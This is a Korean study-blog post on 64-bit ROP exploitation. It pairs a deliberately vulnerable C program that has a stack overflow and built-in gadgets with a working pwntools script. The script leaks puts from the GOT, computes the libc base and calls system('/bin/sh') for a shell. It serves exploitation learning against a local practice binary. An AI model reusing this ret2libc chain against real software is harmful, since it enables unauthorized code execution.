---
title: "[PWNABLE] ROP_64bit"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전에서는 32비트에 다뤘다면 이번에는 64비트를 다루겠다. #include void gift(){ __asm__ (\"pop %r9\"); __asm__ (\"pop %r8\"); __asm__ (\"pop %rcx\"); __asm__ (\"pop %rdx\""
date: "2023-12-01"
translation_key: "tistory-c12e6171f061"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-ROP64bit"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※**** 

이전에서는 32비트에 다뤘다면 이번에는 64비트를 다루겠다.

```
#include <stdio.h>

void gift(){
	 __asm__ ("pop %r9");
	__asm__ ("pop %r8");
	__asm__ ("pop %rcx");
	__asm__ ("pop %rdx");
	__asm__ ("pop %rsi");
	__asm__ ("pop %rdi");
	__asm__ ("ret");
	__asm__ ("pop %rax");
   	__asm__ ("ret");
  	__asm__ ("pop %rbx");
 	__asm__ ("ret");
 	__asm__ ("mov %rbx, (%rax)");
 	__asm__ ("ret");
 	__asm__ ("mov %rax, (%rbx)");
 	__asm__ ("ret");
}

int main(){
	char input[0x50];
	puts("Hello! Whrd ");

	read(0,input,0x100);
	return 0 ;
}
```

이전에 수행했던 예제에 가젯들만 추가로 주어주었다.

64비트에서는 rdi, rsi, rdx, rcx, r8, r9 순으로 레지스터를 사용한다는 것을 잊지 말아야한다.

이전과 달리 레지스터를 사용해야 하기 때문에 chain을 구성하는 것에 있어서

실행하고자 하는 함수 실행 이전에 레지스터에 값들이 들어가 있어야 한다.

때문에 가젯 -> 인자 -> 함수 순으로 들아가야 한다.

![](/assets/images/tistory/tistory-c12e6171f061/001.png)

buf의 크기는 0x50이다.

32비트와 공격 방법은 유사하기 때문에 생각하기 쉬울 것이다.

0x50 + 0x8 + p\_rdi + puts\_got + puts\_plt 순으로 입력하면 된다.

![](/assets/images/tistory/tistory-c12e6171f061/002.png)

이런 방식으로 입력하면 main()이후에 바로 puts()에 의해서 puts()의 실제 주소가 출력이 된다.

이후 다시 main()으로 복귀하면 이전과는 다르게 함수의 주소를 가지고 있기 때문에 libc\_base를 구할 수 있다.

이를 이용해서 shell을 취득하면 된다,

위의 것만 주의해주면 나머지는 32비트와 동일한 벙븝올 수행이 가능하다.

```
from pwn import *

p = process('./rop64')
e = ELF('./rop64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.log_level = 'debug'

###############################################
p_rdi = 0x0000000000401165
ret = 0x000000000040101a

puts_plt = e.plt['puts']
puts_got = e.got['puts']
main = e.sym['main']

########## Stage 1 : libc_base ################

payload = b'A'*0x50
payload += b'B'*0x8
payload += p64(p_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendafter(b'Whrd',payload)
p.recvn(2)
libc_base = u64(p.recvn(6).ljust(8,b'\x00')) - libc.sym['puts']
print('libc_base = ', hex(libc_base))

########## Stage 2 : attack ## ################

system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A'*0x50
payload += b'B'*0x8
payload += p64(ret)
payload += p64(p_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendafter(b'Whrd', payload)
p.interactive()
```
